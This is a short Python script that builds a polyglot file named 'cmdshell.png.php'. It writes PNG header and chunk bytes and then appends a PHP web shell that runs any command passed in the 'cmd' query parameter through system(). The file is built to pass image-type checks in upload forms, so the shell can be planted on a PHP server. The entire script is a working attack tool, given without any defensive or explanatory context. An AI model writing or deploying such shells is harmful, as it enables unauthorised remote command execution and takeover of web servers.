# Create a fake PNG file with embedded PHP shell
fake_png_file = "cmdshell.png.php"

# PNG file header and minimal chunks
png_header = b"\x89PNG\r\n\x1a\n"
png_ihdr_chunk = b"\x00\x00\x00\x0dIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde"
png_iend_chunk = b"\x00\x00\x00\x00IEND\xaeB`\x82"

# PHP web shell code
php_shell = """
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
"""

# Combine the PNG data and PHP code
with open(fake_png_file, "wb") as f:
    # Write PNG header
    f.write(png_header)
    f.write(png_ihdr_chunk)
    f.write(png_iend_chunk)
    # Add a newline to separate PNG data and PHP code
    f.write(b"\n")
    # Write the PHP shell
    f.write(php_shell.encode())

print(f"Fake PNG file with PHP shell created: {fake_png_file}")

